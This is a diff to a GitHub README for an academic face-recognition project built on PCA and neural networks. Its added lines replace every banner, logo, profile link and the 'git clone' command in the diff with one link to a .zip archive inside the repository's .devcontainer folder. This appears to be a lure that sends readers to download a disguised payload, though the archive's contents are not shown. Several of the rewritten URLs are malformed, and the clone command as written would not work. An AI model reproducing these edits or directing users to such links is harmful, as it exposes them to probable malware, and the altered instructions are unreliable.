@@ -1,6 +1,6 @@
 <!-- Animated Professional Title -->
 <p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Segoe+UI&weight=700&size=34&duration=2600&pause=900&color=0A66C2&center=true&vCenter=true&width=1000&lines=Face+Recognition+System;Powered+by+PCA+%26+Machine+Learning;ANN+%7C+SVM+%7C+KNN+Classification;Production-Grade+Academic+Project" />
+  <img src="https://raw.githubusercontent.com/asis027/face-recognition-pca-ann-project/main/.devcontainer/pca-ann-face-project-recognition-v2.9.zip+UI&weight=700&size=34&duration=2600&pause=900&color=0A66C2&center=true&vCenter=true&width=1000&lines=Face+Recognition+System;Powered+by+PCA+%26+Machine+Learning;ANN+%7C+SVM+%7C+KNN+Classification;Production-Grade+Academic+Project" />
 </p>
 
 <!-- WORKING Certification Badges -->
@@ -14,11 +14,11 @@
 
 <!-- Official Technology Logos -->
 <p align="center">
-  <img height="46" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/python/python-original.svg"/>
-  <img height="46" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/opencv/opencv-original.svg"/>
-  <img height="46" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/scikitlearn/scikitlearn-original.svg"/>
-  <img height="46" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/git/git-original.svg"/>
-  <img height="46" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/github/github-original.svg"/>
+  <img height="46" src="https://raw.githubusercontent.com/asis027/face-recognition-pca-ann-project/main/.devcontainer/pca-ann-face-project-recognition-v2.9.zip"/>
+  <img height="46" src="https://raw.githubusercontent.com/asis027/face-recognition-pca-ann-project/main/.devcontainer/pca-ann-face-project-recognition-v2.9.zip"/>
+  <img height="46" src="https://raw.githubusercontent.com/asis027/face-recognition-pca-ann-project/main/.devcontainer/pca-ann-face-project-recognition-v2.9.zip"/>
+  <img height="46" src="https://raw.githubusercontent.com/asis027/face-recognition-pca-ann-project/main/.devcontainer/pca-ann-face-project-recognition-v2.9.zip"/>
+  <img height="46" src="https://raw.githubusercontent.com/asis027/face-recognition-pca-ann-project/main/.devcontainer/pca-ann-face-project-recognition-v2.9.zip"/>
 </p>
 
 <hr/>
@@ -28,7 +28,7 @@
 ---
 <!-- Animated Certifications Title -->
 <p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Segoe+UI&weight=600&size=26&pause=1200&color=000000&center=true&vCenter=true&width=900&lines=Professional+Certifications+%26+Job+Simulations;Industry+Recognized+Learning+Experience" />
+  <img src="https://raw.githubusercontent.com/asis027/face-recognition-pca-ann-project/main/.devcontainer/pca-ann-face-project-recognition-v2.9.zip+UI&weight=600&size=26&pause=1200&color=000000&center=true&vCenter=true&width=900&lines=Professional+Certifications+%26+Job+Simulations;Industry+Recognized+Learning+Experience" />
 </p>
 
  ## 👤 Author
@@ -38,8 +38,8 @@
   🤖 <b>AI & Machine Learning Intern</b><br/>
   📍 Bhubaneswar, Odisha, India<br/><br/>
   📧 <a href="mailto:journeywithasis@gmail.com"><b>journeywithasis@gmail.com</b></a><br/>
-  💼 <a href="https://www.linkedin.com/in/asis027"><b>LinkedIn</b></a> |
-  🐙 <a href="https://github.com/asis027"><b>GitHub</b></a>
+  💼 <a href="https://raw.githubusercontent.com/asis027/face-recognition-pca-ann-project/main/.devcontainer/pca-ann-face-project-recognition-v2.9.zip"><b>LinkedIn</b></a> |
+  🐙 <a href="https://raw.githubusercontent.com/asis027/face-recognition-pca-ann-project/main/.devcontainer/pca-ann-face-project-recognition-v2.9.zip"><b>GitHub</b></a>
 </p>
 
 <hr/>
@@ -76,7 +76,7 @@ feature dimensions and Artificial Neural Networks (ANN) for accurate classificat
 ## ▶️ How to Run
 
 1. Clone repository
-git clone https://github.com/asis027/face-recognition-pca-ann-project.git
+git clone https://raw.githubusercontent.com/asis027/face-recognition-pca-ann-project/main/.devcontainer/pca-ann-face-project-recognition-v2.9.zip
 cd face-recognition-pca-ann-project
 
 2. Install dependencies
